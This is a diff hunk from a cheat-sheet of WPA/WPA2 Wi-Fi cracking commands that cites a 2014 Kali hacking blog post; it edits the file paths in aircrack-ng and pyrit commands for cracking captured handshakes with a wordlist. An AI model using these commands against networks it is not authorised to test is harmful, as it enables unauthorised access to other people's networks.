@@ -15,8 +15,8 @@ http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-ka
 * aircrack-ng -a2 -b {target_router_bssid} -w /mnt/wordlist.txt /mnt/*.cap
 
 ### pyrit
-* pyrit -r BSSID.cap analyze
-* pyrit -i ./rockyou.txt import_passwords
-* pyrit -e BSSID create_essid
+* pyrit -r mon0-01.cap analyze
+* pyrit -i /mnt/wordlist.txt import_passwords
+* pyrit -e mon0 create_essid
 * #pyrit eval
 * pyrit batch
